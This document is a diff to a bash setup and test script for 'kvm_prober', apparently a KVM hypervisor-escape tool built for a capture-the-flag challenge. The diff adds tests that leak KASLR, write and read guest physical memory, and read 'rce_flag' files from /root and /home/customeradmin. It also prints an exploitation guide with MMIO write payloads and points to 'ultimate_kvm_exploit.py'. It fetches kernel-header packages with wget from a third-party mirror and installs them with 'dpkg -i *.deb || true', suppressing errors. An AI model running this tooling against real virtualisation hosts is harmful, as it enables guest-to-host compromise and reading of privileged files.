@@ -50,29 +50,41 @@ check_root() {
 check_dependencies() {
     print_info "Checking dependencies..."
 
+    local required_deps=(
+        git make gcc sudo xxd gdb build-essential binutils tar
+        linux-kbuild-6.1 linux-compiler-gcc-12-x86
+    )
     local missing_deps=()
+    local missing_headers=()
 
-    if ! command -v gcc &> /dev/null; then
-        missing_deps+=("gcc")
+    # Check each dependency individually
+    for dep in "${required_deps[@]}"; do
+        if ! command -v "$dep" &> /dev/null; then
+            missing_deps+=("$dep")
+        fi
+    done
+
+    # Install missing dependencies
+    if [ ${#missing_deps[@]} -ne 0 ]; then
+        print_warning "Missing dependencies: ${missing_deps[*]}"
+        print_info "Installing with: sudo apt-get install ${missing_deps[*]}"
+        sudo apt-get update
+        sudo apt-get install -y "${missing_deps[@]}"
     fi
 
-    if ! command -v make &> /dev/null; then
-        missing_deps+=("make")
-    fi
-
-    if ! command -v python3 &> /dev/null; then
-        missing_deps+=("python3")
-    fi
-
+    # Check for kernel headers
     if [ ! -d "/lib/modules/$(uname -r)/build" ]; then
         print_warning "Kernel headers not found for $(uname -r)"
-        missing_deps+=("linux-headers-$(uname -r)")
+        missing_headers+=("linux-headers-$(uname -r)")
+        wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-common_6.1.90-1_all.deb
+        wget -q https://debian.sipwise.com/debian-security/pool/main/l/linux/linux-headers-6.1.0-21-amd64_6.1.90-1_amd64.deb
+        dpkg -i *.deb || true
     fi
 
-    if [ ${#missing_deps[@]} -ne 0 ]; then
-        print_error "Missing dependencies: ${missing_deps[*]}"
-        print_info "Install with: apt-get install ${missing_deps[*]}"
-        exit 1
+    # Report what was installed
+    if [ ${#missing_headers[@]} -ne 0 ]; then
+        print_error "Missing headers: ${missing_headers[*]}"
+        print_info "Installed with wget + dpkg"
     fi
 
     print_success "All dependencies found"
@@ -285,6 +297,7 @@ run_basic_tests() {
 
     echo -e "${BLUE}Test 1: Device Access${NC}"
     if kvm_prober getkaslr &>/dev/null; then
+        kvm_prober getkaslr
         print_success "KASLR detection works"
     else
         print_warning "KASLR detection failed (may be expected)"
@@ -293,7 +306,8 @@ run_basic_tests() {
     echo -e "${BLUE}Test 2: GPA Operations (Guest Memory)${NC}"
     if kvm_prober writegpa 1000000 deadbeefcafebabe &>/dev/null; then
         print_success "GPA write works (writes to GUEST memory)"
-        if kvm_prober readgpa 1000000 8 &>/dev/null; then
+        if kvm_prober readgpa 1000000 48 &>/dev/null; then
+            kvm_prober readgpa 1000000 48
             print_success "GPA read works (reads GUEST memory)"
         fi
     else
@@ -308,10 +322,16 @@ run_basic_tests() {
     fi
 
     echo -e "${BLUE}Test 4: File Read (RCE)${NC}"
-    if kvm_prober readfile /etc/hostname 0 50 &>/dev/null; then
-        print_success "File read capability works!"
+
+    # Try reading both paths
+    if kvm_prober readfile /home/customeradmin/rce_flag 0 64 &>/dev/null; then
+        kvm_prober readfile /home/customeradmin/rce_flag 0 64
+        print_success "File read from /home/customeradmin/rce_flag works!"
+    elif kvm_prober readfile /root/rce_flag 0 64 &>/dev/null; then
+        kvm_prober readfile /root/rce_flag 0 64
+        print_success "File read from /root/rce_flag works!"
     else
-        print_warning "File read failed"
+        print_warning "File read failed for both paths"
     fi
 
     echo ""
@@ -339,7 +359,8 @@ show_exploitation_guide() {
     echo "  kvm_prober writemmio_buf <bar+offset> 4443424241efbeadde"
     echo ""
     echo -e "${CYAN}Method 4: RCE File Read${NC}"
-    echo "  kvm_prober readfile /root/rce_flag 0 256"
+    echo "  kvm_prober readfile /home/customeradmin/rce_flag 0 64"
+    echo "  kvm_prober readfile /root/rce_flag 0 64"
     echo ""
     echo -e "${CYAN}Ultimate Exploit (Recommended):${NC}"
     echo "  sudo python3 ultimate_kvm_exploit.py"
